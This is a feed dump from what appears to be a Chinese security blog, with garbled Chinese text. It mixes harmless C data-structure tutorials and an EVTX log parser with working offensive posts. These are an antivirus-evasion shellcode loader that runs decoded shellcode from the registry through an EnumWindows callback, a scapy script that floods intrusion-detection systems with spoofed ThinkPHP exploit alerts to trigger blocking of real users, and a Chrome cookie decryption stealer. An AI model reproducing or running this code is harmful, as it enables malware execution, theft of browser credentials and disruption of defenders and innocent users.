char buff[BUF_SIZE] = { 0 };
for (int i = 0; i &amp;lt; strbuf.length(); i++) {
buff[i] = strbuf[i];
}
// shellcode å¤„ç†ï¼Œä¸¤ä¸ªä¸¤ä¸ªä¸€èµ·ï¼Œè¿˜åŸæˆ \x00 çš„æ ·å­
char* p = buff;
unsigned char* shellcode = (unsigned char*)calloc(strlen(buff) / 2, sizeof(unsigned char));
for (size_t i = 0; i &amp;lt; strlen(buff) / 2; i++) {
sscanf(p, &amp;#34;%2hhx&amp;#34;, &amp;amp;shellcode[i]);
p += 2;
}
SIZE_T bufSize = strlen(buff) / 2;
printf(&amp;#34;Decrypted buffer:\n&amp;#34;);
for (int i = 0; i &amp;lt; bufSize; i++) {
printf(&amp;#34;\\x%02x&amp;#34;, shellcode[i]);
}
LSTATUS a = RegSetValueExA(rootKey, &amp;#34;HelloTest&amp;#34;, 0, 3, shellcode, bufSize);
HANDLE HeapHandle = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
BYTE* exec = (BYTE*)HeapAlloc(HeapHandle, HEAP_ZERO_MEMORY, 0);
LSTATUS b = RegQueryValueExA(rootKey, &amp;#34;HelloTest&amp;#34;, 0, 0, 0, &amp;amp;cbData);
LSTATUS c = RegQueryValueExA(rootKey, &amp;#34;HelloTest&amp;#34;, 0, 0, exec, &amp;amp;cbData);
if (c == ERROR_SUCCESS) {
//EnumSystemLocalesA((LOCALE_ENUMPROCA)exec, 0);
// EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)exec, LGRPID_SUPPORTED, 0);
EnumWindows((WNDENUMPROC)exec, NULL);
CloseHandle(exec);
}
}
&lt;/code>&lt;/pre></content><category scheme="https://if1sh.com/categories/%E6%94%BB/" term="æ”»" label="æ”»"/><category scheme="https://if1sh.com/categories/%E5%85%8D%E6%9D%80/" term="å…æ€" label="å…æ€"/><category scheme="https://if1sh.com/tags/%E5%85%8D%E6%9D%80/" term="å…æ€" label="å…æ€"/></entry><entry><title type="text">c-å•é“¾è¡¨</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/c-%E5%8D%95%E9%93%BE%E8%A1%A8/"/><id>https://if1sh.com/posts/c-%E5%8D%95%E9%93%BE%E8%A1%A8/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2022-02-13T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">//å®šä¹‰èŠ‚ç‚¹ typedef struct node { int data; //èŠ‚ç‚¹å­˜æ”¾æ•°æ® struct node *next; //æŒ‡é’ˆåŸŸ } node; //å®šä¹‰å¤´æŒ‡é’ˆ typedef struct list { intâ€¦â€¦</summary><content type="html">&lt;pre tabindex="0">&lt;code>//å®šä¹‰èŠ‚ç‚¹
typedef struct node {
int data; //èŠ‚ç‚¹å­˜æ”¾æ•°æ®
struct node *next; //æŒ‡é’ˆåŸŸ
} node;
//å®šä¹‰å¤´æŒ‡é’ˆ
typedef struct list {
int size; //é“¾è¡¨çš„é•¿åº¦
struct node *next; //æŒ‡é’ˆåŸŸ
} list;
list *crete_list() {
//ç”¨mallocå¼€è¾Ÿä¸€å—listå¤§å°çš„å†…å­˜,è¿”å›ä¸€ä¸ªlistçš„æŒ‡é’ˆ
list *l = malloc(sizeof(list));
//åˆ¤æ–­ç”³è¯·å†…å­˜æ˜¯å¦æˆåŠŸ
if (l == NULL) {
printf(&amp;#34;mem error&amp;#34;);
return 0;
}
//åˆå§‹åŒ–
l-&amp;gt;size = 0; //å¤´èŠ‚ç‚¹çš„æ•°æ®åŸŸ,ç”¨æ¥è¡¨ç¤ºé“¾è¡¨çš„é•¿åº¦
l-&amp;gt;next = NULL;
return l;
}
node *crate_node() {
node *n = malloc(sizeof(node));
if (n == NULL) {
printf(&amp;#34;mem error&amp;#34;);
return 0;
}
n-&amp;gt;data = 0;
n-&amp;gt;next = NULL;
return n;
}
//å¤´æ’
int head_add(list *list, int data) {
//æ–°å»ºç©ºèŠ‚ç‚¹
node *new_node = crate_node();
new_node-&amp;gt;data = data;
new_node-&amp;gt;next = list-&amp;gt;next;
list-&amp;gt;next = new_node;
list-&amp;gt;size++;
return list;
}
//å°¾æ’
int tail_add(list *list, int data) {
node *new_node = crate_node();
new_node-&amp;gt;data = data;
node *last = list-&amp;gt;next;
//å¦‚æœlastä¸ºNULLå°±è¯æ˜æ˜¯å°¾èŠ‚ç‚¹äº†,ç›´æ¥æ’å…¥
if (!last) {
list-&amp;gt;next = new_node;
} else {
//å½“lastçš„nextå€¼ä¸æ˜¯NULL,ä¿å­˜åˆ°lastæŒ‡é’ˆ
while (last-&amp;gt;next) {
last = last-&amp;gt;next;
}
//æ–°èŠ‚ç‚¹æ’å…¥åˆ°last next
last-&amp;gt;next = new_node;
}
list-&amp;gt;size++;
return list;
}
//æ’å…¥
//é“¾è¡¨çš„å¢åŠ ç»“ç‚¹æ“ä½œä¸»è¦åˆ†ä¸ºæŸ¥æ‰¾åˆ°ç¬¬iä¸ªä½ç½®ï¼Œå°†è¯¥ä½ç½®çš„nextæŒ‡é’ˆä¿®æ”¹ä¸ºæŒ‡å‘æˆ‘ä»¬æ–°æ’å…¥çš„ç»“ç‚¹ï¼Œè€Œæ–°æ’å…¥çš„ç»“ç‚¹nextæŒ‡é’ˆæŒ‡å‘æˆ‘ä»¬i+1ä¸ªä½ç½®çš„ç»“ç‚¹ã€‚å…¶æ“ä½œæ–¹å¼å¯ä»¥è®¾ç½®ä¸€ä¸ªå‰é©±ç»“ç‚¹ï¼Œåˆ©ç”¨å¾ªç¯æ‰¾åˆ°ç¬¬iä¸ªä½ç½®ï¼Œå†è¿›è¡Œæ’å…¥ã€‚
list *list_insert(list *list, int data, int pos) {
node *curr = list;
int i;
for (i = 0; i &amp;lt; pos; i++) {
curr = curr-&amp;gt;next; //æŸ¥æ‰¾ç¬¬iä¸ªä½ç½®çš„å‰é©±ç»“ç‚¹
}
//æ–°å»ºèŠ‚ç‚¹
node *new_node = crate_node();
//èµ‹å€¼èŠ‚ç‚¹data
new_node-&amp;gt;data = data;
//æ’å…¥
new_node-&amp;gt;next = curr-&amp;gt;next;
curr-&amp;gt;next = new_node;
/* é“¾è¡¨é•¿åº¦+1 */
list-&amp;gt;size++;
return list;
}
//åˆ é™¤èŠ‚ç‚¹
list *list_del(list *list, int pos) {
int i;
node *curr = list;
//éå†é“¾è¡¨æ‰¾åˆ°è¦åˆ é™¤çš„èŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªæŒ‡é’ˆ
for (i = 0; i &amp;lt; pos; i++) {
curr = curr-&amp;gt;next;
}
//ä¸´æ—¶è®°å½•è¢«åˆ é™¤çš„èŠ‚ç‚¹
node *temp = curr-&amp;gt;next;
//åˆ é™¤èŠ‚ç‚¹
curr-&amp;gt;next = curr-&amp;gt;next-&amp;gt;next;
//é‡Šæ”¾æ‰è¢«åˆ é™¤èŠ‚ç‚¹çš„å†…å­˜
free(temp);
list-&amp;gt;size--;
return list;
}
//åˆ é™¤å€¼
list *list_vul_del(list *list, int data) {
node *curr;
node *p = list-&amp;gt;next;
while (p-&amp;gt;data != data) {
curr = p;
p = p-&amp;gt;next;
}
curr-&amp;gt;next = p-&amp;gt;next;
free(p);
list-&amp;gt;size--;
return list;
}
void print_list(list *list) {
//æ‰“å°é“¾è¡¨æ€»é•¿åº¦
printf(&amp;#34;len: %d\n&amp;#34;, list-&amp;gt;size);
int i = 0;
//list-&amp;gt;nextå€¼å°±æ˜¯ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆå˜é‡,æ¯ä¸ªèŠ‚ç‚¹éƒ½ä¼šä¿å­˜ç€ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„å€¼
node *p = list-&amp;gt;next;
while (p) {
printf(&amp;#34;ç¬¬%dä¸ªå…ƒç´ çš„å€¼ä¸º:%d\n&amp;#34;, ++i, p-&amp;gt;data);
p = p-&amp;gt;next;
}
}
int main() {
list *l = crete_list();
head_add(l, 1);
head_add(l, 2);
head_add(l, 10);
tail_add(l, 100);
tail_add(l, 111);
list_insert(l, 520, 1);
list_del(l, 2);
list_vul_del(l, 520);
print_list(l);
}
&lt;/code>&lt;/pre></content><category scheme="https://if1sh.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" term="æ•°æ®ç»“æ„" label="æ•°æ®ç»“æ„"/></entry><entry><title type="text">c-äºŒå‰æ ‘</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/c-%E4%BA%8C%E5%8F%89%E6%A0%91/"/><id>https://if1sh.com/posts/c-%E4%BA%8C%E5%8F%89%E6%A0%91/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2022-02-13T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; /* æ ‘çš„èŠ‚ç‚¹ */ typedef struct tree_node { /* å·¦å­©å­æŒ‡é’ˆ */ struct tree_node *left; /* å³å­©å­æŒ‡é’ˆ */ struct tree_node *right; /* å…³é”®å­— */ char key; }tree_node;â€¦â€¦</summary><content type="html">&lt;pre tabindex="0">&lt;code>#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
/* æ ‘çš„èŠ‚ç‚¹ */
typedef struct tree_node {
/* å·¦å­©å­æŒ‡é’ˆ */
struct tree_node *left;
/* å³å­©å­æŒ‡é’ˆ */
struct tree_node *right;
/* å…³é”®å­— */
char key;
}tree_node;
/* åˆ›å»ºä¸€ä¸ªèŠ‚ç‚¹ */
tree_node *tree_create_node(char key)
{
tree_node *node = (struct tree_node*)malloc(sizeof(struct tree_node));
if(node==NULL) return NULL;
node-&amp;gt;key = key;
node-&amp;gt;left = NULL;
node-&amp;gt;right = NULL;
return node;
}
/* åˆ›å»ºä¸€æ£µäºŒå‰æ ‘ */
tree_node *tree_create()
{
char str;
tree_node *current;
scanf(&amp;#34;%c&amp;#34;, &amp;amp;str);
// input ABD##E##CF##G##
if(&amp;#39;#&amp;#39; == str)
{
current = NULL;
}
else {
current = tree_create_node(str);
current-&amp;gt;left = tree_create();
current-&amp;gt;right = tree_create();
}
return current;
}
/* å‰åºéå† */
void preorder_traverse1(tree_node *node)
{
if(node != NULL) {
printf(&amp;#34;%c\t&amp;#34;, node-&amp;gt;key);
preorder_traverse1(node-&amp;gt;left);
preorder_traverse1(node-&amp;gt;right);
}
}
/* ä¸­åºéå† */
void inorder_traverse1(tree_node *node)
{
if(node != NULL) {
inorder_traverse1(node-&amp;gt;left);
printf(&amp;#34;%c\t&amp;#34;, node-&amp;gt;key);
inorder_traverse1(node-&amp;gt;right);
}
}
/* ååºéå† */
void postorder_traverse1(tree_node *node)
{
if(node != NULL) {
postorder_traverse1(node-&amp;gt;left);
postorder_traverse1(node-&amp;gt;right);
printf(&amp;#34;%c\t&amp;#34;, node-&amp;gt;key);
}
}
int main() {
/* ABD##E##CF##G## */
tree_node *root = tree_create();
printf(&amp;#34;\nå‰åºéå†1:&amp;#34;);
preorder_traverse1(root);
printf(&amp;#34;\n\nä¸­åºéå†1:&amp;#34;);
inorder_traverse1(root);
printf(&amp;#34;\n\nååºéå†1:&amp;#34;);
postorder_traverse1(root);
printf(&amp;#34;\n&amp;#34;);
return 0;
}
&lt;/code>&lt;/pre></content><category scheme="https://if1sh.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" term="æ•°æ®ç»“æ„" label="æ•°æ®ç»“æ„"/></entry><entry><title type="text">c-å“ˆå¸Œè¡¨</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/c-%E5%93%88%E5%B8%8C%E8%A1%A8/"/><id>https://if1sh.com/posts/c-%E5%93%88%E5%B8%8C%E8%A1%A8/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2022-02-13T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; typedef struct hash_node { void *key; void *val; struct hash_node *next; } hash_node; typedef struct hash_table { hash_node **table; int size; // hashmask https://its301.com/article/qing_gee/120260024 int sizemask; } hash_table; unsigned int hash_33(char *str) { unsigned int hashâ€¦â€¦</summary><content type="html">&lt;pre tabindex="0">&lt;code>#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
typedef struct hash_node {
void *key;
void *val;
struct hash_node *next;
} hash_node;
typedef struct hash_table {
hash_node **table;
int size;
// hashmask https://its301.com/article/qing_gee/120260024
int sizemask;
} hash_table;
unsigned int hash_33(char *str) {
unsigned int hash = 5381;
while (*str) {
hash += (hash &amp;lt;&amp;lt; 5) + (*str++);
}
return (hash &amp;amp; 0x7FFFFFFF);
}
hash_table *hash_table_create() {
hash_table *hashTable = (hash_table *) malloc(sizeof(hash_table));
if (hashTable == NULL) return NULL;
hashTable-&amp;gt;size = 1024;
hashTable-&amp;gt;sizemask = hashTable-&amp;gt;size - 1;
// ç”³è¯·1024ä¸ªèŠ‚ç‚¹å†…å­˜,å¯ä»¥çœ‹ä½œæ˜¯æ•°ç»„
hashTable-&amp;gt;table = (hash_node **) malloc(sizeof(hash_node *) * (hashTable-&amp;gt;size));
if (hashTable-&amp;gt;table == NULL) return NULL;
//æ•°ç»„å…ƒç´ ç½®é›¶
memset(hashTable-&amp;gt;table, 0, sizeof(hash_node *) * (hashTable-&amp;gt;size));
return hashTable;
}
//è¿™ä¸ªèŠ‚ç‚¹ç›¸å½“äºæ˜¯å•é“¾è¡¨
hash_node *hash_node_create(void *key, void *val) {
hash_node *hashNode = (hash_node *) malloc(sizeof(hash_node));
if (hashNode == NULL) return NULL;
hashNode-&amp;gt;next = NULL;
hashNode-&amp;gt;val = NULL;
hashNode-&amp;gt;key = NULL;
return hashNode;
}
hash_table *hash_table_insert(hash_table *hashTable, void *key, void *val) {
unsigned int hash = hash_33(key);
int pos = hash &amp;amp; hashTable-&amp;gt;sizemask;
hash_node *hashNode = hash_node_create(key, val);
hashNode-&amp;gt;next = hashTable-&amp;gt;table[pos];
hashTable-&amp;gt;table[pos] = hashNode;
return hashTable;
}
void *get_val(hash_table *hashTable, void *key) {
unsigned int hash = hash_33(key);
int pos = hash &amp;amp; hashTable-&amp;gt;sizemask;
if (hashTable-&amp;gt;table[pos] == 0) return NULL;
hash_node *current = hashTable-&amp;gt;table[pos];
while (current) {
if (hash_33(current-&amp;gt;key) == hash_33(key)) {
return current-&amp;gt;val;
} else {
current = current-&amp;gt;next;
}
}
return NULL;
}
int main() {
hash_table *hashTable = hash_table_create();
hash_table_insert(hashTable, &amp;#34;test1&amp;#34;, &amp;#34;dsafasdfads&amp;#34;);
puts(get_val(hashTable, &amp;#34;test1&amp;#34;));
return 0;
}
&lt;/code>&lt;/pre></content><category scheme="https://if1sh.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" term="æ•°æ®ç»“æ„" label="æ•°æ®ç»“æ„"/></entry><entry><title type="text">windows evtxæ—¥å¿—è§£æ</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/windows-evtx%E6%97%A5%E5%BF%97%E8%A7%A3%E6%9E%90/"/><id>https://if1sh.com/posts/windows-evtx%E6%97%A5%E5%BF%97%E8%A7%A3%E6%9E%90/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2022-02-09T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">windows evtxæ—¥å¿—è§£æ åœ¨æº¯æºè¿‡ç¨‹ä¸­ä½¿ç”¨Log Parser,Event Log Explorerä¹‹ç±»çš„å·¥å…·éœ€è¦ç†Ÿæ‚‰å·¥å…·çš„â€¦â€¦</summary><content type="html">&lt;h1 id="windows-evtxæ—¥å¿—è§£æ">windows evtxæ—¥å¿—è§£æ&lt;/h1>
&lt;p>åœ¨æº¯æºè¿‡ç¨‹ä¸­ä½¿ç”¨Log Parser,Event Log Explorerä¹‹ç±»çš„å·¥å…·éœ€è¦ç†Ÿæ‚‰å·¥å…·çš„è¯­æ³•,æœ‰çš„è¿˜è¦æ”¶è´¹,é‡åˆ°å¤§æ–‡ä»¶æ‰“å¼€è¿˜ä¼šå¡æ­»&lt;/p>
&lt;p>è¿˜æ˜¯è§£æäº†åœ¨åŒ¹é…æ‰€éœ€å…³é”®ä¿¡æ¯è¾ƒä¸ºæ–¹ä¾¿&lt;/p>
&lt;pre tabindex="0">&lt;code>import Evtx.Evtx as evtx
import Evtx.Views as e_views
def main():
import argparse
parser = argparse.ArgumentParser(
description=&amp;#34;Dump a binary EVTX file into XML.&amp;#34;)
parser.add_argument(&amp;#34;--evtx&amp;#34;, type=str,
help=&amp;#34;Path to the Windows EVTX event log file&amp;#34;)
args = parser.parse_args()
try:
with evtx.Evtx(args.evtx) as log:
with open(&amp;#39;windows_log.xml&amp;#39;, &amp;#39;w&amp;#39;) as f:
f.write(e_views.XML_HEADER)
f.write(&amp;#34;&amp;lt;Events&amp;gt;&amp;#34;)
for record in log.records():
print(record.xml())
f.write(record.xml())
f.write(&amp;#34;&amp;lt;/Events&amp;gt;&amp;#34;)
except:
pass
if __name__ == &amp;#34;__main__&amp;#34;:
main()
&lt;/code>&lt;/pre></content><category scheme="https://if1sh.com/categories/%E9%98%B2/" term="é˜²" label="é˜²"/><category scheme="https://if1sh.com/categories/window%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/" term="Windowæ—¥å¿—åˆ†æ" label="Windowæ—¥å¿—åˆ†æ"/><category scheme="https://if1sh.com/tags/window%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/" term="Windowæ—¥å¿—åˆ†æ" label="Windowæ—¥å¿—åˆ†æ"/></entry><entry><title type="text">scapy attack snort</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/scapy-attack-snort/"/><id>https://if1sh.com/posts/scapy-attack-snort/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2021-11-01T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">hwçš„æ—¶å€™é˜²å®ˆæ–¹éƒ½æ˜¯å‡ ç™¾å·äººå¯¹å‡ æ”¯æ”»å‡»é˜Ÿï¼ŒåŠ ä¸Šå†…ç½‘ä¸€å¤§å †å‘Šè­¦è®¾å¤‡æœ‰äº›çƒ¦ ä¸€ä¸ªæ¶å¿ƒæµé‡è®¾â€¦â€¦</summary><content type="html">&lt;p>hwçš„æ—¶å€™é˜²å®ˆæ–¹éƒ½æ˜¯å‡ ç™¾å·äººå¯¹å‡ æ”¯æ”»å‡»é˜Ÿï¼ŒåŠ ä¸Šå†…ç½‘ä¸€å¤§å †å‘Šè­¦è®¾å¤‡æœ‰äº›çƒ¦&lt;/p>
&lt;p>ä¸€ä¸ªæ¶å¿ƒæµé‡è®¾å¤‡çš„å°æ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡ä¼ªé€ å‘Šè­¦ï¼Œè€—å°½é˜²å®ˆæ–¹ä½“åŠ›&lt;/p>
&lt;p>è¿˜å¯ä»¥é€šè¿‡ç»„åˆå‘Šè­¦æµé‡ï¼Œæ¥è§¦å‘nidsçš„soarï¼Œå®ç°è®©ä»–ä»¬è‡ªå·±å°ç¦è‡ªå·±ï¼Œä¹Ÿå¯ä»¥å¼•å…¥çº¯çœŸipæ± ï¼Œè®©ä»–ä»¬å¤§è§„æ¨¡å°ç¦çœŸå®ç”¨æˆ·&lt;/p>
&lt;p>demo&lt;/p>
&lt;pre tabindex="0">&lt;code>#!/usr/bin/env python
from scapy.all import *
packet_ip = IP(src=&amp;#34;192.168.1.222&amp;#34;, dst=&amp;#34;192.168.1.143&amp;#34;)
udp_3 = UDP(sport=4444, dport=16464)
payload_3 = &amp;#34;index/\think\View/display&amp;amp;content=%22%3C?%3E%3C?php%20phpinfo();?%3E&amp;amp;data=18&amp;#34;
packet_3 = packet_ip / udp_3 / payload_3
packets = [packet_3]
send(packets, loop=1)
&lt;/code>&lt;/pre></content><category scheme="https://if1sh.com/categories/%E6%94%BB/" term="æ”»" label="æ”»"/></entry><entry><title type="text">chromeè§£å¯†</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/chrome%E8%A7%A3%E5%AF%86/"/><id>https://if1sh.com/posts/chrome%E8%A7%A3%E5%AF%86/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2021-10-28T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">chromeè§£å¯† &amp;#34;&amp;#34;&amp;#34; 1ï¼šè·å–local stateæ–‡ä»¶ä½ç½® 2ï¼šè·å–åŠ å¯†çš„key(baseâ€¦â€¦</summary><content type="html">&lt;h1 id="chromeè§£å¯†">chromeè§£å¯†&lt;/h1>
&lt;pre tabindex="0">&lt;code>&amp;#34;&amp;#34;&amp;#34;
1ï¼šè·å–local stateæ–‡ä»¶ä½ç½®
2ï¼šè·å–åŠ å¯†çš„key(base64ç¼–ç )
3ï¼šDPAPIè§£å¯†
4ï¼šase-gcmè§£å¯†
5ï¼šè§£æsqlliteæ–‡ä»¶
&amp;#34;&amp;#34;&amp;#34;
import os
import json
import base64
import win32crypt
import sqlite3
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
def AESGCM_decode(key, data):
# 5.ase-gcmè§£å¯†
nonce, cipherbytes = data[3:15], data[15:]
aesgcm = AESGCM(key)
plainbytes = aesgcm.decrypt(nonce, cipherbytes, None)
plaintext = plainbytes.decode(&amp;#39;utf-8&amp;#39;)
return plaintext
def get_key():
# 1.è·å–key
LocalState = os.path.join(os.environ[&amp;#39;LOCALAPPDATA&amp;#39;], r&amp;#34;Google\Chrome\User Data\Local State&amp;#34;) # å¯†é’¥æ–‡ä»¶
with open(LocalState, &amp;#39;r&amp;#39;, encoding=&amp;#39;utf-8&amp;#39;) as f:
s = json.load(f)[&amp;#39;os_crypt&amp;#39;][&amp;#39;encrypted_key&amp;#39;]
# 2.è§£å¯†base64
encrypted_key_with_header = base64.b64decode(s)
# print(encrypted_key_with_header)
# 3.å»é™¤å¤´5ä½çš„DPAPI
encrypted_key = encrypted_key_with_header[5:]
key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
return key
def get_cookie():
Cookies = os.path.join(os.environ[&amp;#39;USERPROFILE&amp;#39;],
r&amp;#39;AppData\Local\Google\Chrome\User Data\default\Cookies&amp;#39;) # cookieæ–‡ä»¶
con = sqlite3.connect(Cookies)
res = con.execute(&amp;#39;select host_key,name,encrypted_value from cookies&amp;#39;).fetchall()
con.close()
key = get_key()
for i in res:
print(i[2])
print(i[0], i[1], AESGCM_decode(key, i[2]))
if __name__ == &amp;#39;__main__&amp;#39;:
get_cookie()
&lt;/code>&lt;/pre></content><category scheme="https://if1sh.com/categories/%E6%94%BB/" term="æ”»" label="æ”»"/></entry><entry><title type="text">ä»£ç å®¡è®¡æ–¹æ³•è®º</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%96%B9%E6%B3%95%E8%AE%BA/"/><id>https://if1sh.com/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%96%B9%E6%B3%95%E8%AE%BA/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2021-02-16T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">ä»£ç å®¡è®¡æ–¹æ³•è®º ä¸€ã€å®šä¹‰ è½¯ä»¶ä»£ç å®¡è®¡æ˜¯åœ¨ä¸€ä¸ªç¼–ç¨‹ä¸­å¯¹æºä»£ç æ—¨åœ¨å‘ç°é”™è¯¯ã€å®‰å…¨æ¼æ´æˆ–è¿åâ€¦â€¦</summary><content type="html">&lt;h1 id="ä»£ç å®¡è®¡æ–¹æ³•è®º">ä»£ç å®¡è®¡æ–¹æ³•è®º&lt;/h1>
&lt;p>ä¸€ã€å®šä¹‰&lt;/p>
&lt;p>è½¯ä»¶ä»£ç å®¡è®¡æ˜¯åœ¨ä¸€ä¸ªç¼–ç¨‹ä¸­å¯¹æºä»£ç æ—¨åœ¨å‘ç°é”™è¯¯ã€å®‰å…¨æ¼æ´æˆ–è¿åç¼–ç¨‹çº¦å®šçš„é¡¹ç›®ã€‚å®ƒæ˜¯é˜²å¾¡æ€§ç¨‹åºè®¾è®¡èŒƒä¾‹ï¼Œå®ƒè¯•å›¾åœ¨è½¯ä»¶å‘å¸ƒä¹‹å‰å‡å°‘é”™è¯¯ã€‚Cã€C++ã€phpæºä»£ç æ˜¯æœ€å¸¸è§çš„å®¡è®¡ä»£ç ï¼Œå› ä¸ºè®¸å¤šé«˜çº§è¯­è¨€ï¼Œå¦‚Pythonï¼Œå…·æœ‰è¾ƒå°‘çš„æ½œåœ¨æ˜“å—æ”»å‡»çš„å‡½æ•°ï¼ˆä¾‹å¦‚ï¼Œä¸æ£€æŸ¥è¾¹ç•Œçš„å‡½æ•°ï¼‰â€”â€”ç»´åŸºç™¾ç§‘&lt;/p>
&lt;p>ä»£ç æ£€æŸ¥æ˜¯å®¡è®¡å·¥ä½œä¸­æœ€å¸¸ç”¨çš„æŠ€æœ¯æ‰‹æ®µï¼Œå®é™…åº”ç”¨ä¸­ï¼Œé‡‡ç”¨â€œè‡ªåŠ¨åˆ†æ+äººå·¥éªŒè¯â€çš„æ–¹å¼è¿›è¡Œã€‚é€šå¸¸æ£€æŸ¥é¡¹ç›®åŒ…æ‹¬:ç³»ç»Ÿæ‰€ç”¨å¼€æºæ¡†æ¶ã€æºä»£ç è®¾è®¡ã€é”™è¯¯å¤„ç†ä¸å½“ã€ç›´æ¥å¯¹è±¡å¼•ç”¨ã€èµ„æºæ»¥ç”¨ã€APIæ»¥ç”¨ã€åé—¨ä»£ç å‘ç°ç­‰ï¼Œé€šå¸¸èƒ½å¤Ÿè¯†åˆ«å¦‚ä¸‹ä»£ç ä¸­çš„é£é™©ç‚¹ï¼š&lt;/p>
&lt;p>è·¨ç«™è„šæœ¬æ¼æ´ã€è·¨ç«™è¯·æ±‚ä¼ªè£…æ¼æ´ã€SQLæ³¨å…¥æ¼æ´ã€å‘½ä»¤æ‰§è¡Œæ¼æ´ã€æ—¥å¿—ä¼ªé€ æ¼æ´ã€å‚æ•°ç¯¡æ”¹ã€å¯†ç æ˜æ–‡å­˜å‚¨ã€é…ç½®æ–‡ä»¶ç¼ºé™·ã€è·¯å¾„æ“ä½œé”™è¯¯ã€èµ„æºç®¡ç†ã€ä¸å®‰å…¨çš„Ajaxè°ƒç”¨ã€ç³»ç»Ÿä¿¡æ¯æ³„éœ²ã€è°ƒè¯•ç¨‹åºæ®‹ç•™ã€ç¬¬ä¸‰æ–¹æ§ä»¶æ¼æ´ã€æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€è¿œç¨‹ä»£ç æ‰§è¡Œã€è¶Šæƒä¸‹è½½ã€æˆæƒç»•è¿‡æ¼æ´ã€‚&lt;/p>
&lt;p>äºŒã€é—®é¢˜&lt;/p>
&lt;p>1ã€ä»£ç ä¸æ¶æ„å¤æ‚&lt;/p>
&lt;p>å‡ åä¸‡ã€å‡ ç™¾ä¸‡è¡Œä»£ç ã€ä¸€ä¸ªä¸šåŠ¡åˆ†å‡ åä¸ªæ¨¡å—å‡ åä¸ªä»£ç ä»“åº“å®¶å¸¸ä¾¿é¥­ï¼›å¼€å‘è¯­è¨€å¤šç§å¤šæ ·ï¼Œå„ç§è‡ªç ”æ¡†æ¶ã€æµè¡Œæ¡†æ¶åº”æ¥ä¸æš‡ã€æ¶æ„è¿˜éå¸¸å¤æ‚ã€‚&lt;/p>
&lt;p>ä»¥ä¸Šä¸¤ä¸ªé—®é¢˜å¯¹å®¡è®¡äººå‘˜ã€SASTå·¥å…·æ¥è¯´æ— ç–‘éƒ½æ˜¯å¾ˆå¤§çš„æŒ‘æˆ˜ã€‚&lt;/p>
&lt;p>2ã€å·¥å…·å‡†å¬ç‡&lt;/p>
